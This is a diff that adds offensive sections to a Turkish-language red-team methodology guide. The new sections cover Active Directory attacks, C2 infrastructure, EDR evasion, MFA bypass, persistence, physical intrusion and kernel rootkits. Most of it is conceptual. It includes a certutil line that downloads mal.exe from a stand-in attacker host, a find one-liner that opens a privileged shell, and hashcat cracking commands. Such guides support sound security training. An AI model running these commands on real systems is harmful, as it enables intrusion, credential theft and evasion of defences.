@@ -30,10 +30,27 @@ Kırmızı Takım operasyonlarımız, **Cyber Kill Chain** ve **MITRE ATT&CK** �
 - Registry anahtarları, Scheduled Task'lar veya Cron job'lar ile yeniden başlatma sonrası erişimi koruma.
 - **Rootkit** kullanımı (Gerekirse).
 
-### 5. Yanal Hareket (Lateral Movement)
+### 5. Yanal Hareket (Lateral Movement) & Domain Dominance
 *Kalede gezinmek.*
 - `Mimikatz` ile parola hash'lerini (Pass-the-Hash) veya biletleri (Pass-the-Ticket) çalma.
-- Ağ içerisindeki diğer sunuculara (Domain Controller gibi) sıçrama.
+- **BloodHound**: Active Directory içindeki gizli ilişkileri ve yetki yükseltme yollarını görselleştirme.
+- **Golden Ticket**: Krbtgt hash'ini çalarak domain üzerinde sınırsız yetki ve kalıcılık sağlayan sahte TGT oluşturma.
+
+---
+
+## 🏗️ Gelişmiş Altyapı: Command & Control (C2)
+
+Profesyonel bir operasyon, sadece bir reverse shell değil, sağlam bir altyapı gerektirir.
+
+### 1. C2 Mimari Tasarımı
+- **Redirectors (Yönlendiriciler)**: Ana C2 sunucusunu gizlemek için önüne konulan (genellikle Nginx veya Socat ile) ara sunucular.
+- **Domain Fronting**: Trafiği güvenilir bir CDN (örn: Azure, Cloudflare) arkasına saklayarak firewall engellerini aşma.
+
+### 2. EDR Evasion (Tespit Atlatma)
+Modern antivirüs ve EDR (Endpoint Detection and Response) sistemlerini aşma teknikleri.
+- **API Unhooking**: EDR'ın Windows API'leri üzerine koyduğu "kancaları" (hooks) bypass ederek doğrudan Kernel seviyesinde işlem yapma.
+- **Direct Syscalls**: Standart API'leri kullanmak yerine doğrudan System Call kullanarak EDR izlemesinden kaçma.
+- **In-Memory Execution**: Dosyayı diske yazmadan doğrudan RAM üzerinde çalıştırma (Reflective DLL Injection).
 
 ---
 
@@ -146,6 +163,121 @@ hashcat -m 13100 hashes.kerberoast wordlist.txt
 # Hashcat ile Kırma (Mod 18200)
 hashcat -m 18200 hashes.asreproast wordlist.txt
 ```
+
+---
+
+## ⚡ İleri Seviye Atak Geliştirme: Exploit Development
+
+Kodun içindeki mantıksal hatalardan ziyade, işlemci ve bellek seviyesindeki zafiyetlere odaklanın.
+
+### 1. Bellek Yolsuzluğu (Memory Corruption)
+- **Stack Buffer Overflow**: Gereğinden fazla veri göndererek yığında (stack) bulunan `Return Address`'i ezmek ve kontrol akışını ele geçirmek.
+- **Heap Overflow**: Dinamik bellek alanında (heap) bulunan veri yapılarını bozarak rastgele kod çalıştırma.
+
+### 2. Modern Bellek Korumaları & Bypass
+- **DEP/NX (Data Execution Prevention)**: Belleğin veri yazılan kısımlarının çalıştırılmasını engeller.
+  - *Bypass*: **ROP (Return Oriented Programming)** - Sistemdeki mevcut güvenilir kod parçalarını (gadgets) birleştirerek yeni bir fonksiyon oluşturma.
+- **ASLR (Address Space Layout Randomization)**: Uygulamanın bellekteki adreslerini her seferinde değiştirir.
+  - *Bypass*: **Memory Leak** zafiyetlerini kullanarak bir baz adresi sızdırmak ve diğer adresleri hesaplamak.
+
+### 3. Kabuk Kodlama (Shellcoding)
+Zafiyet tetiklendikten sonra çalıştırılacak olan, genellikle "şifreli" veya "polimorfik" ham işlemci komutları (OpCodes).
+
+---
+
+## 🔑 Modern Kimlik Doğrulama Atlatma (MFA Bypass)
+
+Statik parolalar artık tek başına yeterli değil, ancak MFA da bükülemez değildir.
+
+### 1. Adversary-in-the-Middle (AiTM)
+Saldırganın, kurban ile gerçek login sayfası arasına girmesi.
+- **Session Hijacking**: Parolayı değil, login sonrası tarayıcıya set edilen `Session Cookie`'sini çalmak. Bu sayede MFA çoktan geçilmiş olur.
+- **Araçlar**: `Evilginx2`, `Mevil`.
+
+### 2. MFA Yorgunluğu (Push Exhaustion)
+Kurbanın telefonuna üst üste onlarca onay isteği göndererek, kazaen veya bıkkınlıkla "Onayla" demesini sağlama tekniği.
+
+### 3. Bulut Token Manipülasyonu (Token Theft)
+Sistemde sızan veya bellekte kalan Bulut (Azure/AWS) erişim token'larını çalmak.
+- **Geçiş**: `PRT (Primary Refresh Token)` çalınarak Microsoft Entra ID (Azure AD) üzerinde MFA istemeden oturum açılabilir.
+
+---
+
+## ☣️ İleri Seviye Kalıcılık (Persistence)
+
+Bir sisteme sızmak zordur, ancak orada tespit edilmeden kalmak daha zordur.
+
+### 1. WMI Event Subscriptions
+WMI (Windows Management Instrumentation) kullanarak sistemsel tetikleyicilere (örn: bilgisayarın açılması, belirli bir prosesin başlaması) kod bağlama.
+- **Stealth**: Dosyasız (fileless) bir yöntemdir, kayıt defterinde veya diskte bir `.exe` gerektirmez.
+
+### 2. COM Hijacking
+Sistemin kullandığı Component Object Model (COM) anahtarlarını, kendi zararlı DLL veya executable dosyamıza yönlendirmek.
+- **Uygulama**: `CLSID` anahtarlarını manipüle ederek meşru bir uygulama çalıştığında saldırganın kodunun da çalışmasını sağlama.
+
+### 3. AD Delegation Atakları (Yetki Devri)
+Active Directory ortamında bir servis hesabının, başka bir kullanıcı adına işlem yapabilme yetkisinin suistimal edilmesi.
+- **Unconstrained Delegation**: Servis hesabının, ona bağlanan her kullanıcının `TGT`'sini belleğe kaydetmesi (En tehlikelisi).
+- **Constrained Delegation**: Sadece belirli servislere yetki devri.
+- **RBCD (Resource-Based Constrained Delegation)**: Hedef bilgisayar üzerinde kimlerin yetki devri yapabileceğini saldırganın belirlemesi (Yetki yükseltme için kritik).
+
+---
+
+## 🎯 Gelişmiş Operasyonlar: Adversary Emulation
+
+Saldırganları sadece taklit etmeyin, onları otomatikleştirin.
+
+### 1. Atomic Red Team (ART)
+MITRE ATT&CK matrisindeki teknikleri hızlıca test etmek için kullanılan küçük ve modüler testler.
+- **Kullanım**: `Invoke-AtomicTest T1003` (LSA Secrets dökümü testi).
+- **Amaç**: Mavi takımın tespit mekanizmalarını doğrulamak.
+
+### 2. LotL (Living off the Land) - Yerleşik Silahlar
+Saldırganın sistemde hazır bulunan, "güvenilir" araçları kendi amaçları için kullanması.
+- **LOLBAS (Windows)**: `Certutil.exe` kullanarak dosya indirmek veya `Mshta.exe` ile script çalıştırmak.
+  - *Örnek*: `certutil -urlcache -f http://atacker.com/mal.exe out.exe`
+- **GTFOBins (Linux)**: `Nmap` veya `Find` gibi root yetkisiyle çalışan araçlar üzerinden kabuk (shell) almak.
+  - *Örnek*: `find . -exec /bin/sh -p \; -quit`
+
+---
+
+## 🚪 İleri Seviye Fiziksel Erişim (Physical Red Teaming)
+
+En güçlü güvenlik duvarı bile, saldırgan fiziksel olarak odaya girdiğinde anlamsızlaşabilir.
+
+### 1. RFID & NFC Klonlama (Proxmark3)
+Bina giriş kartlarının ve personel yaka kartlarının kopyalanması.
+- **Proxmark3**: LF (125kHz) ve HF (13.56MHz) kartları okuma, simüle etme ve klonlama için kullanılan endüstri standardı araç.
+- **Saldırı**: Yakın mesafeden (skimming) bir personelin kart verisini çekip boş bir karta yazmak.
+
+### 2. BadUSB & HID Atakları (Rubber Ducky)
+Bilgisayarın "klavye" olarak tanıdığı, takıldığı anda saniyeler içinde önceden programlanmış komutları koşturan cihazlar.
+- **Payload**: `DuckyScript` kullanılarak şifrelerin çalınması veya sistemde arka kapı açılması.
+
+### 3. Fiziksel Atlatma (Physical Bypass)
+- **Lockpicking**: Kilit açma teknikleri ve kilitlerin zayıf yönlerinin analizi.
+
+---
+
+## 🦾 Çekirdek Seviyesi Operasyonlar (Kernel-Mode Offense)
+
+Kullanıcı modundaki (Ring-3) kısıtlamaları aşıp, işletim sisteminin kalbine (Ring-0) iniş.
+
+### 1. Rootkit Teknolojileri & DKOM
+**DKOM (Direct Kernel Object Manipulation)**: Çekirdek nesnelerini (örn: `EPROCESS` listesi) doğrudan manipüle ederek bir prosesi işletim sisteminden tamamen saklama.
+- **Görünmezlik**: Proses ne Task Manager'da ne de standart API'lar ile görülebilir.
+
+### 2. Driver Manual Mapping
+Windows'un **DSE (Driver Signature Enforcement)** korumasını aşmak için, imzalı bir sürücüdeki zafiyeti kullanarak (örn: `BYOVD - Bring Your Own Vulnerable Driver`) belleğe imzasız kod yükleme sanatı.
+- **Süreç**: `ntoskrnl.exe` üzerinden kernel adreslerini çözme ve sürücüyü manuel olarak haritalama.
+
+### 3. Kernel Hooking (IRP & IAT/EAT)
+- **IRP (I/O Request Packet) Hooking**: Sistemin disk veya ağ ile kurduğu iletişimin arasına girerek veriyi manipüle etme veya saklama.
+- **SSDT Hooking**: Sistem çağrılarını (syscalls) izlemek ve değiştirmek için kullanılan klasik ama etkili yöntemler.
+
+---
+
+
 
 ### 🕸️ OWASP Top 10: Hızlı Payloads
 
